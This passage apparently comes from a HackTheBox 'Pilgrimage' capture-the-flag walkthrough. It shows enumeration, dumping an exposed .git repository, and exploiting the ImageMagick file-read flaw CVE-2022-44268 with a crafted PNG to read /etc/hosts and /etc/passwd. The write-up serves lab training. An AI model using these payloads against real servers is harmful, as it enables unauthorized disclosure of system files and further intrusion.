+</span></span><span class="line"><span class="cl">└─$ cat /etc/hosts
+</span></span><span class="line"><span class="cl">127.0.0.1       localhost
+</span></span><span class="line"><span class="cl">127.0.1.1       kali
+</span></span><span class="line"><span class="cl">::1             localhost ip6-localhost ip6-loopback
+</span></span><span class="line"><span class="cl">ff02::1         ip6-allnodes
+</span></span><span class="line"><span class="cl">ff02::2         ip6-allrouters
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">10.10.11.219 pilgrimage.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="enumerating-web-service">Enumerating Web Service</h3>
+<p>Visiting the page, we can see it is an image shrinker. We are given the option to upload images, and the files will be presumable compressed and returned to us.</p>
+<p><img src="/post/hackthebox-pilgrimage/Images/landingpage.png"
+	width="1433"
+	height="593"
+	srcset="/post/hackthebox-pilgrimage/Images/landingpage_hu0e3c7587b9a9ecd20cccd422e8e7b712_56874_480x0_resize_box_3.png 480w, /post/hackthebox-pilgrimage/Images/landingpage_hu0e3c7587b9a9ecd20cccd422e8e7b712_56874_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="241"
+		data-flex-basis="579px"
+	
+></p>
+<p>When submitting a sample png, we find that it is saved in <code>/shrunk/</code> under an altered name:</p>
+<p><img src="/post/hackthebox-pilgrimage/Images/shrink1.png"
+	width="1442"
+	height="276"
+	srcset="/post/hackthebox-pilgrimage/Images/shrink1_hu3fec748eb6d49ce68365a702f08ebf24_24841_480x0_resize_box_3.png 480w, /post/hackthebox-pilgrimage/Images/shrink1_hu3fec748eb6d49ce68365a702f08ebf24_24841_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="522"
+		data-flex-basis="1253px"
+	
+></p>
+<p>Trying to upload a non-image file results in a fail message:</p>
+<p><img src="/post/hackthebox-pilgrimage/Images/fail.png"
+	width="1083"
+	height="243"
+	srcset="/post/hackthebox-pilgrimage/Images/fail_huec0ffa938bbee0998929a97789a7f57b_10936_480x0_resize_box_3.png 480w, /post/hackthebox-pilgrimage/Images/fail_huec0ffa938bbee0998929a97789a7f57b_10936_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="445"
+		data-flex-basis="1069px"
+	
+></p>
+<p>When enumerating directories with feroxbuster, we might find an interesting folder named <code>tmp</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Pilgrimage]
+</span></span><span class="line"><span class="cl">└─$ feroxbuster -u http://pilgrimage.htb/          
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> ___  ___  __   __     __      __         __   ___
+</span></span><span class="line"><span class="cl">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+</span></span><span class="line"><span class="cl">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+</span></span><span class="line"><span class="cl">by Ben &#34;epi&#34; Risher 🤓                 ver: 2.10.0
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">301      GET        7l       11w      169c http://pilgrimage.htb/tmp =&gt; http://pilgrimage.htb/tmp/
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From this, we might get an idea of how this process is being done. First, uploaded files are placed in <code>/tmp/</code>, a compression operation is performed and saved to <code>/shrunk/</code>, and the link is sent back to us. There is a possibility that this allows for a race condition, where we might upload a php script, have it saved in <code>/tmp/</code> and execute the script before the shrinking operation is done and the file is cleaned up. Unfortunately, this does not work presumably because the uploaded files are being renamed using some method we don&rsquo;t know.</p>
+<h3 id="discovery-of-git-filesystem">Discovery of git filesystem</h3>
+<p>If we return to nmap after adding our /etc/hosts entry, we might see interesting new information:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for pilgrimage.htb (10.10.11.219)
+</span></span><span class="line"><span class="cl">Host is up (0.054s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.18.0
+</span></span><span class="line"><span class="cl">| http-cookie-flags: 
+</span></span><span class="line"><span class="cl">|   /: 
+</span></span><span class="line"><span class="cl">|     PHPSESSID: 
+</span></span><span class="line"><span class="cl">|_      httponly flag not set
+</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0
+</span></span><span class="line"><span class="cl">|_http-title: Pilgrimage - Shrink Your Images
+</span></span><span class="line"><span class="cl">| http-git: 
+</span></span><span class="line"><span class="cl">|   10.10.11.219:80/.git/
+</span></span><span class="line"><span class="cl">|     Git repository found!
+</span></span><span class="line"><span class="cl">|     Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...
+</span></span><span class="line"><span class="cl">|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 8.97 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nmap can identify a .git repository, and this can be done manually as well, with a curl:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ curl http://pilgrimage.htb/.git/HEAD
+</span></span><span class="line"><span class="cl">ref: refs/heads/master
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This check is not included in may directory brute-forcing wordlists, so it might be easy to miss. Regardless, now that we know, we can retrieve all contents using <a class="link" href="https://github.com/arthaud/git-dumper"  target="_blank" rel="noopener"
+    >git-dumper</a>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Pilgrimage]
+</span></span><span class="line"><span class="cl">└─$ python gitdumper.py http://pilgrimage.htb ./repo
+</span></span><span class="line"><span class="cl">[-] Testing http://pilgrimage.htb/.git/HEAD [200]
+</span></span><span class="line"><span class="cl">[-] Testing http://pilgrimage.htb/.git/ [403]
+</span></span><span class="line"><span class="cl">[-] Fetching common files
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now with the entire repo gathered with <code>git-dumper</code>, we can view the git logs:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Pilgrimage/repo]
+</span></span><span class="line"><span class="cl">└─$ git log                                                                            
+</span></span><span class="line"><span class="cl">commit e1a40beebc7035212efdcb15476f9c994e3634a7 (HEAD -&gt; master)
+</span></span><span class="line"><span class="cl">Author: emily &lt;emily@pilgrimage.htb&gt;
+</span></span><span class="line"><span class="cl">Date:   Wed Jun 7 20:11:48 2023 +1000
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Pilgrimage image shrinking service initial commit.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We have a username <code>emily</code>, but there aren&rsquo;t extra commits to sift through. However, we have the entire web server files available to us now:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Pilgrimage/repo]
+</span></span><span class="line"><span class="cl">└─$ ls -al
+</span></span><span class="line"><span class="cl">total 26972
+</span></span><span class="line"><span class="cl">drwxr-xr-x 5 kali kali     4096 Nov 19 15:17 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 3 kali kali     4096 Nov 19 15:13 ..
+</span></span><span class="line"><span class="cl">drwxr-xr-x 6 kali kali     4096 Nov 19 15:14 assets
+</span></span><span class="line"><span class="cl">-rwxr-xr-x 1 kali kali     5538 Nov 19 15:14 dashboard.php
+</span></span><span class="line"><span class="cl">drwxr-xr-x 7 kali kali     4096 Nov 19 15:14 .git
+</span></span><span class="line"><span class="cl">-rwxr-xr-x 1 kali kali     9250 Nov 19 15:14 index.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x 1 kali kali     6822 Nov 19 15:14 login.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x 1 kali kali       98 Nov 19 15:14 logout.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x 1 kali kali 27555008 Nov 19 15:14 magick
+</span></span><span class="line"><span class="cl">-rwxr-xr-x 1 kali kali     6836 Nov 19 15:14 register.php
+</span></span><span class="line"><span class="cl">drwxr-xr-x 4 kali kali     4096 Nov 19 15:14 vendor
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="foothold-1">Foothold</h2>
+<h3 id="file-read-via-imagemagick">File Read via ImageMagick</h3>
+<p>On the index page, we can see the upload checks being done, and what is done to compress:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;POST&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$image</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Bulletproof\Image</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nv">$image</span><span class="p">[</span><span class="s2">&#34;toConvert&#34;</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$image</span><span class="o">-&gt;</span><span class="na">setLocation</span><span class="p">(</span><span class="s2">&#34;/var/www/pilgrimage.htb/tmp&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$image</span><span class="o">-&gt;</span><span class="na">setSize</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">4000000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$image</span><span class="o">-&gt;</span><span class="na">setMime</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;png&#39;</span><span class="p">,</span><span class="s1">&#39;jpeg&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$upload</span> <span class="o">=</span> <span class="nv">$image</span><span class="o">-&gt;</span><span class="na">upload</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$upload</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">$mime</span> <span class="o">=</span> <span class="s2">&#34;.png&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">$imagePath</span> <span class="o">=</span> <span class="nv">$upload</span><span class="o">-&gt;</span><span class="na">getFullPath</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="nx">mime_content_type</span><span class="p">(</span><span class="nv">$imagePath</span><span class="p">)</span> <span class="o">===</span> <span class="s2">&#34;image/jpeg&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$mime</span> <span class="o">=</span> <span class="s2">&#34;.jpeg&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">$newname</span> <span class="o">=</span> <span class="nx">uniqid</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/&#34;</span> <span class="o">.</span> <span class="nv">$upload</span><span class="o">-&gt;</span><span class="na">getName</span><span class="p">()</span> <span class="o">.</span> <span class="nv">$mime</span> <span class="o">.</span> <span class="s2">&#34; -resize 50% /var/www/pilgrimage.htb/shrunk/&#34;</span> <span class="o">.</span> <span class="nv">$newname</span> <span class="o">.</span> <span class="nv">$mime</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload</span><span class="o">-&gt;</span><span class="na">getFullPath</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">$upload_path</span> <span class="o">=</span> <span class="s2">&#34;http://pilgrimage.htb/shrunk/&#34;</span> <span class="o">.</span> <span class="nv">$newname</span> <span class="o">.</span> <span class="nv">$mime</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">&#39;sqlite:/var/db/pilgrimage&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;INSERT INTO `images` (url,original,username) VALUES (?,?,?)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$upload_path</span><span class="p">,</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;toConvert&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">],</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: /?message=&#34;</span> <span class="o">.</span> <span class="nv">$upload_path</span> <span class="o">.</span> <span class="s2">&#34;&amp;status=success&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see it is using <code>magick</code> to convert, presumably <code>imagemagick</code>. The file is located in the webroot, meaning we have it now as well thanks to git-dumper. Alternatively, it could be downloaded directly from <code>http://pilgrimage.htb/magick</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Pilgrimage/repo]
+</span></span><span class="line"><span class="cl">└─$ curl http://pilgrimage.htb/magick
+</span></span><span class="line"><span class="cl">Warning: Binary output can mess up your terminal. Use &#34;--output -&#34; to tell 
+</span></span><span class="line"><span class="cl">Warning: curl to output it to your terminal anyway, or consider &#34;--output 
+</span></span><span class="line"><span class="cl">Warning: &lt;FILE&gt;&#34; to save to a file.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can easily check the version number with <code>-version</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Pilgrimage/repo]
+</span></span><span class="line"><span class="cl">└─$ ./magick -version
+</span></span><span class="line"><span class="cl">Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
+</span></span><span class="line"><span class="cl">Copyright: (C) 1999 ImageMagick Studio LLC
+</span></span><span class="line"><span class="cl">License: https://imagemagick.org/script/license.php
+</span></span><span class="line"><span class="cl">Features: Cipher DPC HDRI OpenMP(4.5) 
+</span></span><span class="line"><span class="cl">Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
+</span></span><span class="line"><span class="cl">Compiler: gcc (7.5)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ImageMagick has recently disclosed a vulnerability <a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2022-44268"  target="_blank" rel="noopener"
+    >CVE-2022-44268</a>, which might disclose sensitive files with it&rsquo;s image processing. The general idea is this: we send a malicious png pointing to a particular file we want to acquire, and submit it to the shrinker. ImageMagick will process the file and, if the executing user can read it, will append the target file contents to our shrinked image. We can use <a class="link" href="https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC"  target="_blank" rel="noopener"
+    >this proof of concept</a> to generate our malicious png files and read the output contents.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Pilgrimage]
+</span></span><span class="line"><span class="cl">└─$ pngcrush -text a &#34;profile&#34; &#34;/etc/hosts&#34; sample.png 
+</span></span><span class="line"><span class="cl">  Recompressing IDAT chunks in sample.png to pngout.png
+</span></span><span class="line"><span class="cl">   Total length of data found in critical chunks            =      2206
+</span></span><span class="line"><span class="cl">   Best pngcrush method        =   4 (ws 15 fm 0 zl 9 zs 1) =      1201
+</span></span><span class="line"><span class="cl">CPU time decode 0.001745, encode 0.006729, other 0.000800, total 0.010875 sec
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Pilgrimage]
+</span></span><span class="line"><span class="cl">└─$ ls
+</span></span><span class="line"><span class="cl">gitdumper.py  pngout.png  repo  sample.png
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The file is saved as <code>pngout.png</code>. Uploading the file:</p>
+<p><img src="/post/hackthebox-pilgrimage/Images/shrink2.png"
+	width="1027"
+	height="266"
+	srcset="/post/hackthebox-pilgrimage/Images/shrink2_hu0d6f39e7ab3ae813c531e0a54c4864f4_15372_480x0_resize_box_3.png 480w, /post/hackthebox-pilgrimage/Images/shrink2_hu0d6f39e7ab3ae813c531e0a54c4864f4_15372_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="386"
+		data-flex-basis="926px"
+	
+>
+To save the file, we can curl again, or visit the page in browser and select &ldquo;Save As&rdquo;. Retrieving the data hex:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Pilgrimage]
+</span></span><span class="line"><span class="cl">└─$ identify -verbose 655a702e292d2.png 
+</span></span><span class="line"><span class="cl">Image: 655a702e292d2.png
+</span></span><span class="line"><span class="cl">  Format: PNG (Portable Network Graphics)
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">  Raw profile type: 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">     205
+</span></span><span class="line"><span class="cl">3132372e302e302e31096c6f63616c686f73740a3132372e302e312e310970696c677269
+</span></span><span class="line"><span class="cl">6d6167652070696c6772696d6167652e6874620a0a232054686520666f6c6c6f77696e67
+</span></span><span class="line"><span class="cl">206c696e65732061726520646573697261626c6520666f7220495076362063617061626c
+</span></span><span class="line"><span class="cl">6520686f7374730a3a3a3120202020206c6f63616c686f7374206970362d6c6f63616c68
+</span></span><span class="line"><span class="cl">6f7374206970362d6c6f6f706261636b0a666630323a3a31206970362d616c6c6e6f6465
+</span></span><span class="line"><span class="cl">730a666630323a3a32206970362d616c6c726f75746572730a
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>205 is related to the hex length, and the numbers following is the hex output. Using <a class="link" href="https://gchq.github.io/CyberChef/"  target="_blank" rel="noopener"
+    >Cyberchef</a> to convert the output:</p>
+<p><img src="/post/hackthebox-pilgrimage/Images/hosts.png"
+	width="757"
+	height="651"
+	srcset="/post/hackthebox-pilgrimage/Images/hosts_hu0bb0016a34ebb28cb14ba1e819b23883_73296_480x0_resize_box_3.png 480w, /post/hackthebox-pilgrimage/Images/hosts_hu0bb0016a34ebb28cb14ba1e819b23883_73296_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="116"
+		data-flex-basis="279px"
+	
+></p>
+<p>We can use this to grab the /etc/passwd as well:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</span></span><span class="line"><span class="cl"><span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sync</span>
+</span></span><span class="line"><span class="cl"><span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
